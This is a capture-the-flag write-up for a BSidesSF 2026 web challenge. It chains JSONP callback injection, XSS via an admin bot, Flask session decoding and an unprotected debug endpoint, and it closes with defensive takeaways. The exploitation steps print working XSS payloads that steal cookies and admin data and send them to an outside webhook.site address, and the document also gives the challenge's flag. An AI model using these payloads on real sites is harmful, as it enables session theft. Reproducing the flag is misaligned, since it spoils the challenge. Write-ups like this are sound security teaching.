# three-questions-4 — BSidesSF CTF 2026

| Field | Value |
|-------|-------|
| **Category** | Web |
| **Points** | 1000 |
| **Author** | itsc0rg1 |
| **Flag** | `CTF{g0tcast1ngca11back}` |

## Description

> Ask three questions and figure out the musical character, the final time.

A guessing game where you ask 3 out of 6 yes/no questions to identify a musical theatre character from ~60 options. With only 3 binary questions (8 possible outcomes) covering ~60 characters, guessing by logic alone is impossible — you need to cheat.

## TL;DR

JSONP callback injection + XSS via admin bot + Flask session decode to find numeric user ID + debug endpoint leak of the answer.

## Reconnaissance

### Application Structure

- **Login/Register** — standard Flask app with `user_id` cookie (NOT HttpOnly) + `session` cookie (HttpOnly)
- **Game** (`/home`) — 6 yes/no questions about a musical character, limit 3, then guess
- **JSONP endpoint** (`/characters.js?callback=loadCharacters`) — returns character list for admins, "Only admins can view this file" for regular users
- **Debug endpoint** (`/debug/game-state?...`) — leaked in HTML comment `<!-- debug endpoints: /debug/game-state?... -->`
- **Contact admin** (`/contact-admin` → `/admin-message`) — sends message to an admin bot

### Key Observations

1. **JSONP XSS**: The `callback` parameter in `/characters.js?callback=X` is reflected directly into JS output without sanitization:
   ```
   GET /characters.js?callback=alert(1)//
   → alert(1)//("Only admins can view this file");
   ```

2. **Relaxed CSP on `/admin-message`**: The response has a much weaker Content Security Policy than `/home`:
   ```
   script-src 'self' 'unsafe-inline'; connect-src *; img-src * data:
   ```
   This allows inline `<script>` tags AND external connections.

3. **`user_id` cookie is NOT HttpOnly** — accessible via `document.cookie`

4. **Flask session is decodable** — base64 + zlib compressed JSON containing `_user_id` (numeric DB ID)

## Exploitation

### Step 1: XSS via Admin Bot

The admin bot renders HTML from messages. With `unsafe-inline` in the CSP, inline scripts execute. First, verify with a simple image beacon:

```html
<img src="https://webhook.site/UUID?test=ping">
```

Hit received from `34.19.33.4` — admin bot is active.

### Step 2: Exfiltrate Admin Data

Send a script that steals cookies and fetches the character list:

```html
<script>
var c = document.cookie;
fetch("/characters.js?callback=x").then(r=>r.text()).then(chars=>{
  fetch("https://webhook.site/UUID", {
    method: "POST",
    body: JSON.stringify({cookie: c, chars: chars})
  });
});
</script>
```

Result:
- Admin `user_id` cookie: `e114de9e4c8a8b219bb3452d9eaf7754f354c56e`
- Full character list: 60+ characters from Wicked, Hamilton, Les Misérables, Phantom, Frozen, etc.

### Step 3: Decode Flask Session

The `user_id` cookie is a hash, but the debug endpoint needs the **numeric DB ID**. Decode the Flask session cookie:

```python
import base64, json, zlib

session = ".eJwlzjEOw..."
payload = session.split('.')[1] + '==='
data = json.loads(zlib.decompress(base64.urlsafe_b64decode(payload)))
# → {"_fresh": true, "_user_id": "1919", "_id": "9c754e..."}
```

The `_user_id` field contains the numeric DB ID (`1919` for our account).

### Step 4: Debug Endpoint Leaks the Answer

The debug endpoint accepts the numeric user ID and returns the character index:

```
GET /debug/game-state?user_id=1919
→ {"character_index in /characters.js": 1}
```

Index 1 in the character list = **Glinda** (from Wicked).

### Step 5: Win the Game

```
GET /guess?guess=Glinda
→ {"game": "won", "reload": true}
```

The flag appears on the page: `CTF{g0tcast1ngca11back}`

## Key Takeaways

- **JSONP endpoints are dangerous** — if the callback parameter isn't validated, it's a same-origin XSS vector that bypasses CSP `script-src 'self'`
- **Inconsistent CSP across routes** — `/home` had strict CSP but `/admin-message` had `unsafe-inline` + `connect-src *`, enabling the attack
- **Non-HttpOnly cookies** — the `user_id` cookie was accessible to JavaScript, though ultimately unnecessary since the Flask session itself was decodable
- **Debug endpoints in production** — the HTML comment leaked the debug endpoint path, and it accepted any authenticated user's numeric ID without authorization checks (IDOR)
- **Flask session cookies are transparent** — they're signed but NOT encrypted; the payload is just base64+zlib JSON, revealing internal user IDs

## Flag Wordplay

`g0tcast1ngca11back` = "got casting callback" — a double pun on JSONP **callback** functions and musical theatre **casting** calls.

## Files

- `flag.txt` — `CTF{g0tcast1ngca11back}`
